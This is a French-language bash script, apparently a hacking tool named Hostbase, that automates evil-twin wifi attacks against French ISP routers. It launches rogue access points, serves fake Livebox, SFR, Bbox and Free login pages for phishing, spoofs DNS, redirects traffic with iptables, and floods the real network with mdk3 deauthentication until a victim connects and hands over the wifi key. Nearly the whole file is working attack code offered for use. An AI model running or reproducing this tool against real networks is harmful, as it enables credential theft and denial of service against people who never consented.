#!/bin/bash
### Hostbase 0.9 By Koala ###
### Script destiné a des tests sur les réseaux wifi ###
### Under licence GPLv3 http://www.gnu.org/licenses/gpl.txt ###
### Enjoy ###
### En cas de modification du script pour la conf de hostapd ou des options de airbase, ne pas oublier de laisser un espace derrière l'essid (sinon bash ne traduira pas l'espace meme si vous le rentrez)exemple: "{essid} " et un espace derrière {essid} pour hostapd.
### Attention a toute modification sur la partie d'écriture sur les fichiers EOF, un simple espace ou saut a la ligne peut entrainer des erreurs
### Fake page freewifi et freebox a voir

f_Banniere(){
echo -e "\e[1;33m Hostbase version 0.9 (released November 2016) By Koala alias Flow\e[0m"
echo -e "                        |\          )           (                              "
echo -e "                    ____| \__        )         (                               "
echo -e "                   |       @ \        )       (                                "
echo -e "~~~~~~~~~~~~~~~~~~~|~~<->    /         )     (                                 "
echo -e "                   |_________\          ) | (                                  "
echo -e "                    |    |                |                                    "
echo -e "___________________(|)__(|)_____________  |  __________________________________"
echo -e "\e[1;34m Script perso basé sur les rogues AP, hostapd and airbase power.\e[0m"
echo -e "\e[1;34m A usage personnel seulement.\e[0m"
echo
echo -e "\e[1;31m Pour une meilleur lecture des choix et des paramètres, je conseille d'afficher la console en grand ecran.\e[0m"
echo
}
##################################################

trap f_checkexit SIGINT

f_checkexit(){

        echo -e "\n\e[1;34m[*]\e[0m Désactivation du mode moniteur, suppression des fichiers utilisés pour le crack, backup de votre serveur apache... PATIENTEZ !\n"

       sleep 2;
        echo -e "\n\e[1;34m[*]\e[0m Remise a zéro de votre interface wifi\n"
        sudo sysctl net.ipv4.ip_forward=0
        sleep 2;
        airmon-ng stop ${moniteurmode} &> /dev/null
        sleep 4;
        airmon-ng stop ${intmoniteur} &> /dev/null
        sleep 4;
        rfkill unblock all
        ifconfig ${monmode} up      
        systemctl enable NetworkManager.service
        sleep 2;
        systemctl start NetworkManager.service
        sleep 4; 

        
        if [ -f "/tmp/hostapd.pid" ];then
        killall hostapd
        kill 9 `cat /tmp/hostapdclirefresh.pid`
        kill $(< /tmp/terminal.pid)
        killall dnsspoof
        cd /tmp/
        rm -rf *.pid
        rm -rf /tmp/hostapd.conf
        cd /var/www/
        rm -rf *
        sleep 1;
        echo -e "\n\e[1;34m[*]\e[0m Clean up terminated see you later...\n"
        sleep 2;
        for PID in $( ps -e | grep xterm | awk '{print $1;}' ); do kill ${PID} 2>&-; done
        else
        echo -e "\n\e[1;34m[*]\e[0m Clean up terminated see you later...\n"
        sleep 2;
	kill $(< /tmp/terminal.pid)
        for PID in $( ps -e | grep xterm | awk '{print $1;}' ); do kill ${PID} 2>&-; done
fi
	exit 2> /dev/null
}
##################################################

f_wlan(){
echo -e "\e[1;34m[*]\e[0m arrét des services pouvant causer conflit..."
        sleep 2;
airmon-ng check kill
        sleep 5;
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "interface pour l'attaque (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*|wlx*'  ; then
	airmon-ng start ${monmode}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez le nom correct de votre interface !\n"
	sleep 4;
f_wlan
fi

ifconfig -a
unset moniteurmode
while [ -z "${moniteurmode}" ]; do read -p "Nom de l'interface en mode moniteur, (ex: wlan0mon, mon0 etc...): " moniteurmode; done
}

##################################################

f_floodinterface(){
ifconfig -a
unset intmon
while [ -z "${intmon}" ]; do read -p "Name of your second wireless card (enter wlan5 if you use hostapd multi AP): " intmon; done
       if echo ${intmon} | egrep '^wlan*|wlp*|wlx*'  ; then
echo -e "\e[1;34m[*]\e[0m Starting monitor mode."
airmon-ng start ${intmon}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_floodinterface
fi

ifconfig -a
unset intmoniteur
while [ -z "${intmoniteur}" ]; do read -p "Entrez le nom de la seconde interface en mode moniteur: " intmoniteur; done
}

##################################################

f_config(){
clear
f_Banniere
echo "1.  Editer hostapd.conf pour une configuration personnalisée uniquement"
echo "2.  Editer dhcpd.conf pour une configuration personnalisée uniquement"
echo "3.  Menu precedent"
echo
read -p "Choice: " prereqschoice

case ${prereqschoice} in
1) f_nanohostapd ;;
2) f_dhcp ;;
3) f_mainmenu ;;
*) f_config ;;
esac
}
##################################################

f_nanohostapd(){
nano /tmp/hostapd.conf
f_config
}

f_dhcp(){
nano /etc/dhcp/dhcpd.conf
f_config
}

##################################################

f_rogueap(){
clear
chmod a+x dns.txt
f_Banniere
echo "1.  Rogue AP sur résau ouvert avec airbase"
echo "2.  Rogue AP avec hostapd en WPA avec le wps_pbc d'active"
echo "3.  Ddos attack"
echo "4.  Utiliser son fichier perso hostapd.conf (voir dans configuration des fichiers)"
echo "5.  Menu précédent"
echo
read -p "Choix: " fapchoix

case ${fapchoix} in
1) f_opnairbaserogue ;;
2) f_hostapdwps ;;
3) f_interface ;;
4) f_confperso ;;
5) f_mainmenu ;;
*) f_rogueap ;;
esac
}
##################################################

f_opnairbaserogue(){
f_wlan
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
unset essid
while [ -z "${essid}" ]; do read -p "Rentrez le nom du réseau: METTRE UN ESPACE après la dernière lettre: " essid; done



unset channel
while [ -z "${channel}" ]; do read -p "Rentrez le canal du réseau: " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: canal invalide, doit etre entre 1 et 13, tout les paramètres doivent etre correct, recommencez tout!\n"
	sleep 5;
f_opnairbaserogue
fi



unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Quel box avez vous cibler pour le phishing? (ex. livebox sfr bbox sfrwifi ou free): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' || [ "${fakepagechoix}" = 'free' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK, lancement de airbase en open"
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -P -C 30 -c "${channel}" -e "${essid} " "${moniteurmode}" &> /dev/null &
sleep 5;
f_dhcpconf
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez livebox ou sfr ou bbox ou free, tout les paramètres doivent etre correct, recommencez tout!\n"
        sleep 4;
f_opnairbaserogue
fi
}


##################################################

f_dhcpconf(){
echo -e "\e[1;34m[*]\e[0m Configuring at0..."
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface at0;
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
echo -e "\e[1;34m[*]\e[0m Lancement et configuration de at0"
	ifconfig at0 up
        sudo sysctl net.ipv4.ip_forward=1
        ifconfig at0 10.0.0.1 netmask 255.255.255.0
        ifconfig at0 mtu 1400
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
        sleep 2;
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1
        iptables -P FORWARD ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
        echo > '/var/lib/dhcp/dhcpd.leases' 
        echo -e "\e[1;34m[*]\e[0m Lancement du serveur dhcp"
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null & 
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m 0m Lancement de la redirection dns et du serveur apache (ATTENTION: le script affecte la racine du dossier /var/www donc si vous comptez utiliser plus tard votre serveur en ligne merci de verifier les droits d'accès aux pages web)."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i at0 -f /tmp/hostbase/hostbasV0.9/dns.txt &> /dev/null &
       sudo chown -R root:www-data /var/www/*
        sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo chown -R root:www-data /var/www/cle.txt     # Ajout de cette ligne qui pointe sur le fichier en plus car sinon le fichier cle.txt reste dans le groupe root malgré le sudo chown précédent 
        sudo chmod 764 /var/www/cle.txt
        sudo service apache2 restart    
        sleep 4; 
	f_mainmenu
}


################################################## 

f_dhcpconfhtpd(){
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface ${monmode};
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
         ifconfig ${monmode} up
         sudo sysctl net.ipv4.ip_forward=1
         sudo ifconfig ${monmode} 10.0.0.1 netmask 255.255.255.0
         sleep 1;
         iptables --flush
         iptables --table nat --flush
         iptables --delete-chain
         iptables --table nat --delete-chain
         sleep 2;
         route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
         iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1
         iptables -P FORWARD ACCEPT
         iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
         sleep 2;
         echo > '/var/lib/dhcp/dhcpd.leases'
         echo -e "\e[1;34m[*]\e[0m Lancement du serveur dhcp"
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m Lancement de la redirection dns et du serveur apache (ATTENTION: le script affecte la racine du dossier /var/www donc si vous comptez utiliser plus tard votre serveur en ligne merci de verifier les droits d'accès aux pages web)."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /tmp/hostbase/hostbasV0.9/dns.txt &> /dev/null &
       sudo chown -R root:www-data /var/www/*
       sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo chown -R root:www-data /var/www/cle.txt    # Ajout de cette ligne qui pointe sur le fichier en plus car sinon le fichier cle.txt reste dans le groupe root malgré le sudo chown précédent 
        sudo chmod 764 /var/www/cle.txt
        sudo service apache2 restart   
        sleep 4; 
	f_mainmenu
}


##################################################      
 
f_hostapdwps(){
echo -e "\e[1;34m[*]\e[0m Hostapd"
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
touch /tmp/hostapd.conf
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*|wlx*'  ; then 
        ifconfig ${monmode} up
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_hostapdwps
fi

unset essid
while [ -z "${essid}" ]; do read -p "Rentrez le nom du réseau: petite astuce, METTRE UN ESPACE après la dernière lettre: " essid; done


unset channel
while [ -z "${channel}" ]; do read -p "Rentrez le canal du réseau: " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: canal invalide, doit etre entre 1 et 13, tout les paramètres doivent etre correct, recommencez tout!\n"
	sleep 5;
f_hostapdwps
fi

unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Quel box avez vous cibler pour le phishing? (ex. livebox sfr bbox sfrwifi ou free): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ] || [ "${fakepagechoix}" = 'free' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 3;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        touch /tmp/hostapd.conf
sleep 1;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez soit livebox, sfr, bbox, ou free, tout les paramètres doivent etre correct, recommencez tout!\n"
        sleep 4;
f_hostapdwps
fi


cat <<-EOF > /tmp/hostapd.conf
interface=${monmode}
driver=nl80211
ssid=${essid} 
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=${channel}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF
       sleep 2;
       echo -e "\e[1;34m[*]\e[0m Lancement de hostapd en cours, patientez..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /tmp/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
       echo -e "\e[1;34m[*]\e[0m Lancement de hostapd_cli en arrière plan..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
       echo $! >/tmp/hostapdclirefresh.pid
	f_dhcpconfhtpd
}

##################################################

f_ddos(){
clear
f_Banniere
chmod a+x activedos.sh
echo "1.  Ddos mdk3"
echo "2.  Active DoS if you use hostapd rogue AP"
echo "3.  Active DoS if you use airbase rogue AP"
echo "4.  Menu précédent"
echo
read -p "Choix: " ddoschoix

case ${ddoschoix} in
1) f_interface ;;
2) f_wait ;;
3) f_active ;;
4) f_mainmenu ;;
*) f_ddos ;;
esac
}
##################################################

f_interface(){
f_floodinterface
unset ESSID
while [ -z "${ESSID}" ]; do read -p "ESSID du reseau cible: " ESSID; done
        echo -e "\e[1;34m[*]\e[0m OK"


unset canal
while [ -z "${canal}" ]; do read -p "Rentrez le canal du réseau cible: " canal; done
if (($canal >= 1 && $canal <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: canal invalide, doit etre entre 1 et 13, tout les paramètres doivent etre correct, recommencez tout!\n"
	sleep 5;
f_interface
fi


read -ep "                BSSID du réseau cible : " BSSID           
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           
echo -e " $rojo Erreur : BSSID non conforme $colorbase"
echo "  "
read -ep "                BSSID du réseau cible : " BSSID 
echo "  "            
done
f_floodinstantane
}


##################################################

f_floodinstantane(){
           echo -e "\e[1;34m[*]\e[0m Starting ddos... waiting for the target victim..... Be cool and take a drink..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -g -t "${BSSID}" -c "${canal}" &> /dev/null &
sleep 20;
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -c "${canal}" -a "${BSSID}" --essid "${ESSID}" -W 1 ${intmoniteur} &> /dev/null &
sleep 4;
f_mainmenu
}

##################################################

f_wait(){
x-terminal-emulator -e bash activedos.sh
sleep 1;
echo -e "\e[1;34m[*]\e[0m Waiting for the target victim..... Be cool and take a drink..."
until test -s /tmp/hostapd.psk; do
sleep 1;
done
               echo -e "\e[1;34m[*]\e[0m Victim connected, stopping ddos."
sleep 1;
          kill $(< /tmp/terminal.pid)
sleep 1;
          kill `cat /tmp/mdk3.pid`
          kill `cat /tmp/airbase.pid`
sleep 1;
          kill 9 `cat /tmp/hostapdclirefresh.pid`
f_mainmenu
}


##################################################

f_active(){
echo -e "\e[1;34m[*]\e[0m DoS for airbase selected"
sleep 6;
x-terminal-emulator -e bash activedos.sh
sleep 1;
f_mainmenu
}

##################################################

f_confperso(){
      echo -e "\e[1;34m[*]\e[0m Vous avez choisi votre configuration personnel"
sleep 2;

echo -e "\e[1;34m[*]\e[0m Hostapd conf perso"
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*|wlx*'  ; then 
        ifconfig ${monmode} up
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_confperso
fi

unset passerelle
while [ -z "${passerelle}" ]; do read -p "Passerelle de votre fake AP: " passerelle;
if [[ ! ${passerelle} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then ${passerelle}=; fi
done 


unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Quel box avez vous cibler pour le phishing? (ex. livebox sfr bbox ou sfrwifi): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez livebox ou sfr ou bbox ou free, tout les paramètres doivent etre correct, recommencez tout!\n"
        sleep 4;
f_confperso
fi
      
      echo -e "\e[1;34m[*]\e[0m Lancement de hostapd en cours, patientez..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /tmp/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
        ifconfig ${monmode} ${passerelle} netmask 255.255.255.0
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
        sleep 2;
        route add -net ${passerelle} netmask 255.255.255.0 gw ${passerelle}
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ${passerelle}
        iptables -P FORWARD ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ${passerelle}:80
        echo > '/var/lib/dhcp/dhcpd.leases'
        echo 
        sudo sysctl net.ipv4.ip_forward=1
        echo -e "\e[1;34m[*]\e[0m Lancement du serveur dhcp"
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m Lancement de la redirection dns et du serveur apache (ATTENTION: le script affecte la racine du dossier /var/www donc si vous comptez utiliser plus tard votre serveur en ligne merci de verifier les droits d'accès aux pages web)."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /tmp/hostbase/hostbasV0.9/dns.txt &> /dev/null &
        sudo chown -R root:www-data /var/www/*
        sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo chown -R root:www-data /var/www/cle.txt
        sudo chmod 764 /var/www/cle.txt
        xterm -hold -bg '#000000' -fg '#3A94FF' -e sudo service apache2 restart &> /dev/null &    
        sleep 4; 
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /tmp/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
       echo $! >/tmp/hostapdclirefresh.pid
	f_mainmenu
}


##################################################

f_scan(){
        echo -e "\e[1;34m[*]\e[0m OK, analyse des services pouvant causer conflit avec aircrack ou hostapd... PATIENTEZ"
if [ -f "/etc/init/network-manager.conf" ];then
        systemctl stop NetworkManager.service
        systemctl disable NetworkManager.service
        sleep 4;
else
        service wicd stop
        sleep 5;
fi
f_wlan
        echo -e "\e[1;34m[*]\e[0m OK, starting airodump-ng... will come back in 30 second at the main menu..."
sleep 5;
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa ${moniteurmode} &> /dev/null &
sleep 25;
f_rapidecleanup
}

f_rapidecleanup(){
airmon-ng stop ${moniteurmode}
sleep 5;
ifconfig ${monmode} up
f_mainmenu
}

##################################################

f_stop(){
           echo -e "\e[1;34m[*]\e[0m Arret de vos actions précédentes, patientez..."
sleep 2;
airmon-ng stop ${moniteurmode} &> /dev/null
sleep 4;
airmon-ng stop ${intmoniteur} &> /dev/null
sleep 4;
ifconfig ${monmode} up

        if [ -f "/tmp/hostapd.pid" ];then
        killall hostapd
        kill 9 `cat /tmp/hostapdclirefresh.pid`
        killall dnsspoof
        kill $(< /tmp/terminal.pid)
        cd /tmp/
        rm -rf *.pid
        rm -rf /tmp/hostapd.conf
        cd /var/www/
        rm -rf *
        sleep 1;
        killall xterm
        echo -e "\n\e[1;34m[*]\e[0m Attaque stoppée...\n"
        sleep 2;
        f_mainmenu
        else
        kill $(< /tmp/terminal.pid)
        killall xterm
        echo -e "\n\e[1;34m[*]\e[0m Attaque stoppée...\n"
        sleep 2;
	f_mainmenu
fi
}

##################################################

f_mainmenu(){
clear
f_Banniere
echo "1.  Configuration des fichiers"
echo "2.  Fake AP attaque"
echo "3.  Ddos attaque"
echo "4.  Scan passif (éxécuter en PLEIN écran, meilleur visu)"
echo "5.  Stoper l'attaque en cours (si il y en a une)"
echo "6.  Quitter"
echo
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_config ;;
2) unset clean; f_rogueap ;;
3) unset clean; f_ddos ;;
4) unset clean; f_scan ;;
5) unset clean; f_stop ;;
6) f_checkexit ;;
*) f_mainmenu ;;
esac
}

# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m Desole mais ce script a besoin des droits d'admin" 1>&2
	exit 1
else
	clean=1
	f_mainmenu
fi
